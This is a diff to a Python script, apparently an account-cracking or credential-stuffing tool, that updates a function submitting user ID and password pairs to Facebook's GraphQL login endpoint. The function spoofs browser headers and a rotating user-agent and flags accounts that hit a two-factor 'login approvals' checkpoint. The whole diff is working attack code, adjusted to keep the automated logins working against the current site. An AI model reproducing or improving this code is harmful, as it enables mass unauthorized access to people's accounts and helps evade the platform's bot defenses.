@@ -1764,19 +1764,19 @@ def freeq(uid,pwx,tl):
     '__s': '9i0mpn:tl7b2z:wtg4vs',
     '__hsi': '7530975347099937606',
     '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK5o4q0HU1IEGdwtU2ewbS1Lwqo15E6O1FwlU6KaxyU5N90HwtU5K0UEhwjE',
-    '__csr': 'g_8AltPmJcACp2qAarSaXyp8mKSGhbKJ2Vf-Hypp7GmiBO5lG8BC8CiuiB9btqaKBcIWGdyoKE8EcoaGwSyU8Uixmi5ESu487i3W2C-7E4-10yVooU2iwHwkGwnUaUb8iGA2e0Mo3MxicwkU2kw4Aw4Bwq8coy2u0-E2vxm0137UjgoQU08yS00jNO8G00OK8K09Nw1Jaaw7uzy0hU05P60cvw0ETo',
-    '__hsdp': 'gyxWxW43AIR1gOzQH88hUCUEk8yVah4Je6org-222SbUcU5y2OdyE0Ia3F2E1fUG3ma8PZ8w-q2y7Q5U460BU1f83Exe0NE0_C04DE2ow1E60X40bsxki0BC1Qw1nq04mo0oow2GU11E0qkw0EUw3i80xK09Pw',
-    '__hblp': '01SK05Bo0Du02XC0cswcC0bzw3XU0Uq0xo2nw1d61Jwg85C0lq3C0M811E0LG0uW0qG06OU0PG362u0l2mU5C1qw4gw77wkU0De',
-    '__sjsp': 'gyxWxW43AIR1gMiiIwx7yryxgybAF4iQUpxJ3U88boLwPwm8b8Saw2MEeAaw4_yEdoEzeQC49E4x1u11w9u0jO0W8jwcq029y0C80tKg0JO5h82mo7i05tE',
+    '__csr': '...',
+    '__hsdp': '...',
+    '__hblp': '...',
+    '__sjsp': '...',
     '__comet_req': '1',
-    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd': lsd_value,
+    'jazoest': jazoest_value,
     '__spin_r': '1025144028',
     '__spin_b': 'trunk',
     '__spin_t': '1753441837',
     'fb_api_caller_class': 'RelayModern',
     'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
-    'variables': {
+    'variables': json.dumps({
         "input": {
             "client_mutation_id": "1",
             "actor_id": "0",
@@ -1786,13 +1786,13 @@ def freeq(uid,pwx,tl):
                 "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////ffAFAA",
                 "cuid": "",
                 "guid": "ffed65de4275edc5a",
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                "jazoest": jazoest_value,
                 "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=",
                 "lgnjs": "1753441856",
                 "lgnrnd": "041037_s_DL",
                 "locale": "en_GB",
                 "login_source": "comet_headerless_login",
-                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                "lsd": lsd_value,
                 "next": "",
                 "prefill_contact_point": "",
                 "prefill_source": "",
@@ -1802,7 +1802,7 @@ def freeq(uid,pwx,tl):
             },
             "credential_type": "password",
             "enc_password": {
-                "sensitive_string_value": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)
+                "sensitive_string_value": f"#PWD_BROWSER:0:{timestamp}:{pw}"
             },
             "event_request_id": "fccafc56-7793-475a-82b0-79126c38dc00",
             "identifier": uid,
@@ -1812,40 +1812,38 @@ def freeq(uid,pwx,tl):
             "login_source": "COMET_HEADERLESS_LOGIN",
             "next": None,
             "password": {
-                "sensitive_string_value": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)
+                "sensitive_string_value": f"#PWD_BROWSER:0:{timestamp}:{pw}"
             },
             "persistent": True,
             "trusted_device_records": "{}",
             "waterfall_id": "573eeb24-e791-4463-8ccd-00052da7c549"
         },
         "scale": 1
-    },
+    }),
     'server_timestamps': 'true',
     'doc_id': '24540252778892185'
 }
             headers = {
-            'Host': 'mtouch.facebook.com',
-            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
-            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
-            'x-response-format': 'JSONStream',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'viewport-width': '360',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
             'accept': '*/*',
-            'origin': 'https://mtouch.facebook.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.facebook.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="8.0.0.0", "Chromium";v="138.0.7204.159", "Google Chrome";v="138.0.7204.159"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-fb-friendly-name': 'useCDSWebLoginMutation',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://www.facebook.com/api/graphql/"
             po = Session.post(url, data=data, cookies=cookies, headers=headers).text
